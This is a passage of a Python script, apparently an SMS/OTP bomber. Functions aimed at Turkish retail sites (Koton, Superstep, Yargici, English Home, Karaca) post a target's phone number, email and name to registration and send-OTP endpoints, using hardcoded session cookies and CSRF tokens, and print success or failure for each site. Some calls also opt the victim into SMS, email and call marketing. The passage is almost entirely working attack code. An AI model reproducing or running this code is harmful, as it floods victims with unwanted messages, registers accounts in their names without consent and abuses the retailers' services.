name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            response = requests.post(url, headers=headers, data=data)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Koton ====> https://www.koton.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Koton Arıza"+ Style.RESET_ALL)
    def superstep():
        try:                      
                cookies = {
                'csrftoken': 'LrFPPg93w4W3181NXAW0LPIZmA99c6N65Ya7aVFFmTNEsS3syraGGWIdrYr74G7h',
                'ajs_user_id': 'null',
                'ajs_group_id': 'null',
                'ajs_anonymous_id': '%2297c2746d-8af9-4fc0-887b-7c75e5b9e4f9%22',
                '__zlcmid': '1KWmWtWREuT8xI2',
                'OptanonAlertBoxClosed': '2024-02-27T18:49:05.933Z',
                'OptanonConsent': 'isGpcEnabled=0&datestamp=Tue+Feb+27+2024+21%3A49%3A05+GMT%2B0300+(GMT%2B03%3A00)&version=202401.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=858e9462-0d42-425a-9305-b0acfd7e3cb4&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false',
                '_ga': 'GA1.3.866652479.1709059744',
                '_gid': 'GA1.3.430603596.1709059746',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22IKjRYUnD4wB9bz37Ksms%22%7D',
                '_fbp': 'fb.2.1709059746255.1609637117',
                '_tt_enable_cookie': '1',
                '_ttp': 'bUK7XTbO_UgUAp2Qj03__ipP7Ob',
                'OfferMiner_ID': 'TXYWVMVGNMMBPSQV20240227214906',
                '_hjSessionUser_3523987': 'eyJpZCI6IjUyZWI2NjI3LTdjNTItNWU1MC1iZDg2LTM0N2MxODUzMzRmNCIsImNyZWF0ZWQiOjE3MDkwNTk3NDY1MTYsImV4aXN0aW5nIjpmYWxzZX0=',
                '_hjSession_3523987': 'eyJpZCI6ImZiNmZjOTZkLTUzZDgtNDVkMS04YTU2LWVmNWE1N2NhYmM0MCIsImMiOjE3MDkwNTk3NDY1MTcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
                '_ym_uid': '1709059747707684063',
                '_ym_d': '1709059747',
                'cto_bundle': '1ks2sF9TOEdVcExReDhUMHNFeXI2Nm1sJTJGQUVPMkIxWmJrYjJWcnM3Um1rcmQwUG82R1NJYUZMWEx3WndZczZxJTJCQUx4RG1Ib3RpMUc4MThndFYybXU4V042WWZDQ0pKMEgyTnNLSVhtN0I5cXV5T1ZIOUxOQTFLSHpaeXBaanhKSHljOW5pVzBUWDRIJTJCcXFoS1lCS1ZLakxhY3RrNVlYeXBaUDVxczJ0ZjNVZXlaSWtsZVJZRGlITldMJTJCdDZrOG0lMkY5a2RnVE9qU0hESnglMkZhRXJ1elpuZzdldUt3JTNEJTNE',
                '_ym_isad': '2',
                '_gcl_au': '1.1.857431144.1709059854',
                '_gat_UA-39215767-1': '1',
                '_dc_gtm_UA-39215767-1': '1',
                '_ga_1Y5W6LS673': 'GS1.1.1709059744.1.1.1709059866.60.0.2094336241',
                '_ExVID': '6adf97f83acf6453d4a6a4b1070f3754',
                'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%220%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22TXYWVMVGNMMBPSQV20240227214906%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A21%3A06%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.superstep.com.tr%252F%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22_ExVID%22%2C%22V%22%3A%226adf97f83acf6453d4a6a4b1070f3754%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%5D%7D',
                }

                headers = {
                'authority': 'www.superstep.com.tr',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'csrftoken=LrFPPg93w4W3181NXAW0LPIZmA99c6N65Ya7aVFFmTNEsS3syraGGWIdrYr74G7h; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2297c2746d-8af9-4fc0-887b-7c75e5b9e4f9%22; __zlcmid=1KWmWtWREuT8xI2; OptanonAlertBoxClosed=2024-02-27T18:49:05.933Z; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Feb+27+2024+21%3A49%3A05+GMT%2B0300+(GMT%2B03%3A00)&version=202401.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=858e9462-0d42-425a-9305-b0acfd7e3cb4&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false; _ga=GA1.3.866652479.1709059744; _gid=GA1.3.430603596.1709059746; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22IKjRYUnD4wB9bz37Ksms%22%7D; _fbp=fb.2.1709059746255.1609637117; _tt_enable_cookie=1; _ttp=bUK7XTbO_UgUAp2Qj03__ipP7Ob; OfferMiner_ID=TXYWVMVGNMMBPSQV20240227214906; _hjSessionUser_3523987=eyJpZCI6IjUyZWI2NjI3LTdjNTItNWU1MC1iZDg2LTM0N2MxODUzMzRmNCIsImNyZWF0ZWQiOjE3MDkwNTk3NDY1MTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_3523987=eyJpZCI6ImZiNmZjOTZkLTUzZDgtNDVkMS04YTU2LWVmNWE1N2NhYmM0MCIsImMiOjE3MDkwNTk3NDY1MTcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _ym_uid=1709059747707684063; _ym_d=1709059747; cto_bundle=1ks2sF9TOEdVcExReDhUMHNFeXI2Nm1sJTJGQUVPMkIxWmJrYjJWcnM3Um1rcmQwUG82R1NJYUZMWEx3WndZczZxJTJCQUx4RG1Ib3RpMUc4MThndFYybXU4V042WWZDQ0pKMEgyTnNLSVhtN0I5cXV5T1ZIOUxOQTFLSHpaeXBaanhKSHljOW5pVzBUWDRIJTJCcXFoS1lCS1ZLakxhY3RrNVlYeXBaUDVxczJ0ZjNVZXlaSWtsZVJZRGlITldMJTJCdDZrOG0lMkY5a2RnVE9qU0hESnglMkZhRXJ1elpuZzdldUt3JTNEJTNE; _ym_isad=2; _gcl_au=1.1.857431144.1709059854; _gat_UA-39215767-1=1; _dc_gtm_UA-39215767-1=1; _ga_1Y5W6LS673=GS1.1.1709059744.1.1.1709059866.60.0.2094336241; _ExVID=6adf97f83acf6453d4a6a4b1070f3754; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%220%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22TXYWVMVGNMMBPSQV20240227214906%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A21%3A06%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.superstep.com.tr%252F%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22_ExVID%22%2C%22V%22%3A%226adf97f83acf6453d4a6a4b1070f3754%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%5D%7D',
                'origin': 'https://www.superstep.com.tr',
                'referer': 'https://www.superstep.com.tr/login/?next=/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                'csrfmiddlewaretoken': 'lFVVuPnjhLKwtlHaICHQ9BKVi48Q9TtYFcqdPuTV7AB7U5JPjtVw4IK9nsqO1tN9',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'email': f'{mail}',
                'date_of_birth': '1991-03-21',
                'gender': 'male',
                'phone': f'0{phone}',
                'password': 'asdasdasda',
                'email_allowed': 'true',
                'sms_allowed': 'true',
                'call_allowed': 'true',
                'is_allowed': 'true',
                'confirm': 'true',
                'permissions': 'on',
                }

                response = requests.post('https://www.superstep.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Superstep ====> https://www.superstep.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Superstep Arıza"+ Style.RESET_ALL) 
    def yargici():
        try:
                cookies = {
                'inCommerce.customer.info': '1467e3bb-aafe-4d81-92b7-c6c53bfa289c',
                'SelectedRegion': 'true',
                '_gcl_au': '1.1.1416637135.1709060201',
                '_gid': 'GA1.2.329678401.1709060202',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22A9PSgHb7wnPzA7h1DlSo%22%7D',
                'cto_bundle': 'aYoJtl96cnJKQUhSZTM2OFdSJTJCVWhvJTJGZ2hiS1puWnExdUlzWlRUS2hBcWtLTjdRV0ZQdEppWSUyRjhTYWRtcnlrSTJrczUwemlORHNmZUllRDU5JTJCaEZkTFY4eGlDclFUQURrYWo4VlVacGVLZGZTbWNFRWRuTk1YeUwzN0glMkJqcnBXWFAzbFJaTFJOTjBnU0JhbWJhQkRKTlRrZkljazl6TGM3TmtjZld0S1ZkYzB2eFVIZnJ3ODY5bzNtZUMzYnZOdDlFTFNWUUcxdEJqMUU2bFc0a1MlMkJyejVmdEl3JTNEJTNE',
                '_fbp': 'fb.1.1709060202487.1264340958',
                '_clck': '3bgj3v%7C2%7Cfjm%7C0%7C1518',
                'VLCV1OK': '1',
                'OfferMiner_ID': 'LJOFLOSEJWOCCBSV20240227215643',
                '__RequestVerificationToken': 'LJ_h1WAti7dJkbQkOGl3kE53U_yRSgOCT_UrhHps2TSY_tPsDK3JZofJcbj7rpT6cFpZjrmO4tJ7mCFExE9zsr5b9TI1',
                '_clsk': '1fl2q8d%7C1709060715853%7C3%7C1%7Cw.clarity.ms%2Fcollect',
                'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-27%252022%253A05%253A16%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-27%252022%253A05%253A16%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%22513%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252021%253A56%253A43%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%222%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%222%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-27%252021%253A56%253A43%22%2C%22E%22%3A%222024-02-27%2022%3A26%3A43%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22LJOFLOSEJWOCCBSV20240227215643%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VLTB_ABTestC%22%2C%22V%22%3A%22%257B%2522ab%2522%253A%255B%255D%252C%2522sp%2522%253A%255B%255D%257D%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.yargici.com%252F%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%5D%7D',
                '_ga_KPGC21WKW4': 'GS1.1.1709060203.1.1.1709060719.0.0.221798879',
                '_ga': 'GA1.2.157942275.1709060202',
                '_ga_73R69YJ2KE': 'GS1.1.1709060201.1.1.1709060740.34.0.346116205',
                }

                headers = {
                'authority': 'www.yargici.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'inCommerce.customer.info=1467e3bb-aafe-4d81-92b7-c6c53bfa289c; SelectedRegion=true; _gcl_au=1.1.1416637135.1709060201; _gid=GA1.2.329678401.1709060202; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22A9PSgHb7wnPzA7h1DlSo%22%7D; cto_bundle=aYoJtl96cnJKQUhSZTM2OFdSJTJCVWhvJTJGZ2hiS1puWnExdUlzWlRUS2hBcWtLTjdRV0ZQdEppWSUyRjhTYWRtcnlrSTJrczUwemlORHNmZUllRDU5JTJCaEZkTFY4eGlDclFUQURrYWo4VlVacGVLZGZTbWNFRWRuTk1YeUwzN0glMkJqcnBXWFAzbFJaTFJOTjBnU0JhbWJhQkRKTlRrZkljazl6TGM3TmtjZld0S1ZkYzB2eFVIZnJ3ODY5bzNtZUMzYnZOdDlFTFNWUUcxdEJqMUU2bFc0a1MlMkJyejVmdEl3JTNEJTNE; _fbp=fb.1.1709060202487.1264340958; _clck=3bgj3v%7C2%7Cfjm%7C0%7C1518; VLCV1OK=1; OfferMiner_ID=LJOFLOSEJWOCCBSV20240227215643; __RequestVerificationToken=LJ_h1WAti7dJkbQkOGl3kE53U_yRSgOCT_UrhHps2TSY_tPsDK3JZofJcbj7rpT6cFpZjrmO4tJ7mCFExE9zsr5b9TI1; _clsk=1fl2q8d%7C1709060715853%7C3%7C1%7Cw.clarity.ms%2Fcollect; VL_CM_0=%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-27%252022%253A05%253A16%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-27%252022%253A05%253A16%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%22513%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252021%253A56%253A43%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%222%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%222%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-27%252021%253A56%253A43%22%2C%22E%22%3A%222024-02-27%2022%3A26%3A43%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22LJOFLOSEJWOCCBSV20240227215643%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A56%3A43%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A35%3A16%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22VLTB_ABTestC%22%2C%22V%22%3A%22%257B%2522ab%2522%253A%255B%255D%252C%2522sp%2522%253A%255B%255D%257D%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.yargici.com%252F%22%2C%22E%22%3A%222026-02-16%2022%3A05%3A16%22%7D%5D%7D; _ga_KPGC21WKW4=GS1.1.1709060203.1.1.1709060719.0.0.221798879; _ga=GA1.2.157942275.1709060202; _ga_73R69YJ2KE=GS1.1.1709060201.1.1.1709060740.34.0.346116205',
                'origin': 'https://www.yargici.com',
                'referer': 'https://www.yargici.com/register',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                'email': f'{mail}',
                'phoneNumber': f'+90{phone}',
                }
                response = requests.post(
                'https://www.yargici.com/customer/CustomerExistControlRegister',
                cookies=cookies,
                headers=headers,
                data=data
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Yargici ====> https://www.yargici.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX +  "[-]" + "Yargici Arıza"+ Style.RESET_ALL) 
    def englishhome():
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Phone": "+90"+phone}
            r = requests.post(url, headers=headers, json=json)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Englishhome ====> https://www.englishhome.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX +  "[-]" + "Englishhome Arıza"+ Style.RESET_ALL) 
    def karaca():
        try:
                cookies = {
                'language': 'tr',
                'frequency': 'd41d8cd98f00b204e9800998ecf8427e',
                'currency': 'TRY',
                'krc_sessid': 'e7aea35cb96b2a787a73982742',
                'csrf_token': '4c0e843f0a61a3504dc6e6b3db6694ec',
                '_gcl_au': '1.1.542749641.1709038506',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22joVPr7oR8eRP04sSEZsJ%22%7D',
                'PAPVisitorId': 'GxRvfxYmOBXkypTIh313GjEyg2T61gGS',
                'PAPVisitorId': 'GxRvfxYmOBXkypTIh313GjEyg2T61gGS',
                '_ga': 'GA1.3.158263021.1709038508',
                '_gid': 'GA1.3.1949015285.1709038508',
                '_dc_gtm_UA-32636802-1': '1',
                '_p2s_uvi': '076aa116.2783772346424671.1709038509272',
                '_fbp': 'fb.1.1709038509693.945530545',
                '_tt_enable_cookie': '1',
                '_ttp': 'GkqHTl6n1J1wttWfJuiFZtZxPr0',
                '_hjSession_452528': 'eyJpZCI6IjBmNmM4ODQ1LWZhMjYtNDAwYy04OTA5LTc2NDYxMjI5ZDRmNCIsImMiOjE3MDkwMzg1MDk5MTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
                '_hjHasCachedUserAttributes': 'true',
                '_gid': 'GA1.2.1949015285.1709038508',
                '_gat': '1',
                'FPID': 'FPID2.2.2zAmkkjLbczLj3GGJVa6WTah8YF2dMJj7g4Sxdplk%2BQ%3D.1709038508',
                'FPLC': 'yLlEmciUUkaK9olHM39StVEzIAz6dUmqxEg5EMof15LDzpPStZe1KbLT8MDT9y%2FBz5m4P2bvcYZ3NqKJS%2FgV7HxGS2Es8MdSbJSEEC2CtTfbbiWkUoJ4ExEp0WgMaA%3D%3D',
                'FPGSID': '1.1709038525.1709038525.G-V034H5QVBN.VRbN-_Bmutn11T5-n5DZRQ',
                '_ga': 'GA1.1.158263021.1709038508',
                'cto_bundle': 'OFn6VF9yTUo2VGVyY0prOGdZZ0NuTldGYnlSR1YxZ0VucGxCMk9wWUZobkQlMkJzNU5Hb1gyaiUyQmJpZE9VT3dPZW1CODV4S3Q2Sks0clJyWWNITTJHbnA5Wm1rZWxhRkF0MFZ1Q3lsTldja1dQa1FZejZic0owVTElMkJET0tkcTZQeGRwUEFaWjNGOXdpSVYyNGlyeVJEUktEajdlNmN2bTAxYm1RU1c3UGgxOFc1VVlkWnpWN0p4OEFZNU8zbWpXdFZtekJ4biUyRkJSNjVpd1BiaVY1U0JjNzJNVExhJTJCUSUzRCUzRA',
                '__rtbh.uid': '%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22undefined%22%7D',
                '_hjSessionUser_452528': 'eyJpZCI6IjIxYjJmYjI3LTA0ZjMtNWNjMS04MzNlLWMyMDU3ZGM0YzM4YiIsImNyZWF0ZWQiOjE3MDkwMzg1MDk5MTcsImV4aXN0aW5nIjp0cnVlfQ==',
                '_ga_V034H5QVBN': 'GS1.1.1709038507.1.1.1709038529.0.0.0',
                '_gali': 'reg-submit-without-recaptch',
                }       

                headers = {
                'authority': 'www.karaca.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                # 'cookie': 'language=tr; frequency=d41d8cd98f00b204e9800998ecf8427e; currency=TRY; krc_sessid=e7aea35cb96b2a787a73982742; csrf_token=4c0e843f0a61a3504dc6e6b3db6694ec; _gcl_au=1.1.542749641.1709038506; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22joVPr7oR8eRP04sSEZsJ%22%7D; PAPVisitorId=GxRvfxYmOBXkypTIh313GjEyg2T61gGS; PAPVisitorId=GxRvfxYmOBXkypTIh313GjEyg2T61gGS; _ga=GA1.3.158263021.1709038508; _gid=GA1.3.1949015285.1709038508; _dc_gtm_UA-32636802-1=1; _p2s_uvi=076aa116.2783772346424671.1709038509272; _fbp=fb.1.1709038509693.945530545; _tt_enable_cookie=1; _ttp=GkqHTl6n1J1wttWfJuiFZtZxPr0; _hjSession_452528=eyJpZCI6IjBmNmM4ODQ1LWZhMjYtNDAwYy04OTA5LTc2NDYxMjI5ZDRmNCIsImMiOjE3MDkwMzg1MDk5MTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _hjHasCachedUserAttributes=true; _gid=GA1.2.1949015285.1709038508; _gat=1; FPID=FPID2.2.2zAmkkjLbczLj3GGJVa6WTah8YF2dMJj7g4Sxdplk%2BQ%3D.1709038508; FPLC=yLlEmciUUkaK9olHM39StVEzIAz6dUmqxEg5EMof15LDzpPStZe1KbLT8MDT9y%2FBz5m4P2bvcYZ3NqKJS%2FgV7HxGS2Es8MdSbJSEEC2CtTfbbiWkUoJ4ExEp0WgMaA%3D%3D; FPGSID=1.1709038525.1709038525.G-V034H5QVBN.VRbN-_Bmutn11T5-n5DZRQ; _ga=GA1.1.158263021.1709038508; cto_bundle=OFn6VF9yTUo2VGVyY0prOGdZZ0NuTldGYnlSR1YxZ0VucGxCMk9wWUZobkQlMkJzNU5Hb1gyaiUyQmJpZE9VT3dPZW1CODV4S3Q2Sks0clJyWWNITTJHbnA5Wm1rZWxhRkF0MFZ1Q3lsTldja1dQa1FZejZic0owVTElMkJET0tkcTZQeGRwUEFaWjNGOXdpSVYyNGlyeVJEUktEajdlNmN2bTAxYm1RU1c3UGgxOFc1VVlkWnpWN0p4OEFZNU8zbWpXdFZtekJ4biUyRkJSNjVpd1BiaVY1U0JjNzJNVExhJTJCUSUzRCUzRA; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22undefined%22%7D; _hjSessionUser_452528=eyJpZCI6IjIxYjJmYjI3LTA0ZjMtNWNjMS04MzNlLWMyMDU3ZGM0YzM4YiIsImNyZWF0ZWQiOjE3MDkwMzg1MDk5MTcsImV4aXN0aW5nIjp0cnVlfQ==; _ga_V034H5QVBN=GS1.1.1709038507.1.1.1709038529.0.0.0; _gali=reg-submit-without-recaptch',
